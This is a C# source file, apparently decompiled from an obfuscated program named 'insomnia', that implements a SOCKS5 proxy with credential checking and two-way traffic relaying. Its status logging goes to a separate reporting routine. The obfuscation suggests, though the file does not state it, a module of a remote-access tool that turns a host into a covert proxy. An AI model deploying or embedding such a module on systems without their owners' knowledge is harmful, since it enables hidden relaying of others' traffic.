using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia;

internal class Class21
{
	private string Field9 = Class26.Field2;

	private string Field8 = Class26.Field1;

	private TcpClient Field7;

	private TcpClient Field6;

	private byte Field5 = 5;

	private byte Field4 = 2;

	private byte Field3;

	private byte Field2 = 1;

	private byte Field1 = 3;

	public Class21(TcpClient client)
	{
		Field7 = client;
	}

	public void Method1()
	{
		NetworkStream stream = Field7.GetStream();
		byte[] array = new byte[2];
		stream.Read(array, 0, 2);
		byte[] array2 = new byte[array[1]];
		stream.Read(array2, 0, array2.Length);
		byte[] buffer = new byte[2] { Field5, Field4 };
		stream.Write(buffer, 0, 2);
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] array3 = new byte[64];
		stream.Read(array3, 0, 64);
		Convert.ToInt32(array3[0]);
		int num = Convert.ToInt32(array3[1]);
		int num2 = Convert.ToInt32(array3[num + 2]);
		byte[] array4 = new byte[num];
		for (int i = 0; i <= num - 1; i++)
		{
			array4[i] = array3[i + 2];
		}
		byte[] array5 = new byte[num2];
		for (int j = 0; j <= num2 - 1; j++)
		{
			array5[j] = array3[j + num + 3];
		}
		string @string = aSCIIEncoding.GetString(array4);
		string string2 = aSCIIEncoding.GetString(array5);
		if (@string.Equals(Field9) && string2.Equals(Field8))
		{
			byte[] buffer2 = new byte[2] { Field5, Field3 };
			stream.Write(buffer2, 0, 2);
		}
		else
		{
			byte[] buffer3 = new byte[2] { Field5, 2 };
			stream.Write(buffer3, 0, 2);
		}
		byte[] array6 = new byte[4];
		stream.Read(array6, 0, 4);
		string text = "";
		if (array6[3] == Field2)
		{
			byte[] array7 = new byte[4];
			stream.Read(array7, 0, 4);
			IPAddress iPAddress = new IPAddress(array7);
			text = iPAddress.ToString();
		}
		else if (array6[3] == Field1)
		{
			byte[] array8 = new byte[1];
			stream.Read(array8, 0, 1);
			byte[] array9 = new byte[array8[0]];
			stream.Read(array9, 0, array8[0]);
			text = Encoding.Default.GetString(array9);
		}
		else
		{
			try
			{
				Class31.Method3("[SOCKS]: Address type unsupported -> " + array6[3], Class26.Field8);
			}
			catch
			{
			}
		}
		if (text != "")
		{
			byte[] array10 = new byte[2];
			stream.Read(array10, 0, 2);
			int port = BitConverter.ToUInt16(new byte[2]
			{
				array10[1],
				array10[0]
			}, 0);
			Field6 = new TcpClient(text, port);
			if (Field6.Connected)
			{
				byte[] array11 = new byte[10] { Field5, Field3, 0, 1, 0, 0, 0, 0, 0, 0 };
				string ipString = Field6.Client.LocalEndPoint!.ToString()!.Split(new char[1] { ':' })[0];
				IPAddress iPAddress2 = IPAddress.Parse(ipString);
				array11[4] = iPAddress2.GetAddressBytes()[0];
				array11[5] = iPAddress2.GetAddressBytes()[1];
				array11[6] = iPAddress2.GetAddressBytes()[2];
				array11[7] = iPAddress2.GetAddressBytes()[3];
				int num3 = int.Parse(Field6.Client.LocalEndPoint!.ToString()!.Split(new char[1] { ':' })[1]);
				array11[8] = BitConverter.GetBytes((ushort)num3)[0];
				array11[9] = BitConverter.GetBytes((ushort)num3)[1];
				stream.Write(array11, 0, 10);
				NetworkStream stream2 = Field6.GetStream();
				bool flag = false;
				while (Field6.Connected && Field7.Connected && !flag)
				{
					Thread.Sleep(100);
					try
					{
						if (stream.DataAvailable)
						{
							byte[] array12 = new byte[10000];
							int num4 = stream.Read(array12, 0, 10000);
							byte[] array13 = new byte[num4];
							Array.Copy(array12, array13, num4);
							stream2.Write(array13, 0, array13.Length);
						}
						if (stream2.DataAvailable)
						{
							byte[] array14 = new byte[10000];
							int num5 = stream2.Read(array14, 0, 10000);
							byte[] array15 = new byte[num5];
							Array.Copy(array14, array15, num5);
							stream.Write(array15, 0, array15.Length);
						}
					}
					catch
					{
						flag = true;
					}
				}
				if (Field7.Connected)
				{
					Field7.Close();
				}
				if (Field6.Connected)
				{
					Field6.Close();
				}
				return;
			}
			try
			{
				Class31.Method3("[SOCKS]: Connection to target host failed.", Class26.Field8);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			Class31.Method3("[SOCKS]: Terminating host connection.", Class26.Field8);
		}
		catch
		{
		}
	}
}
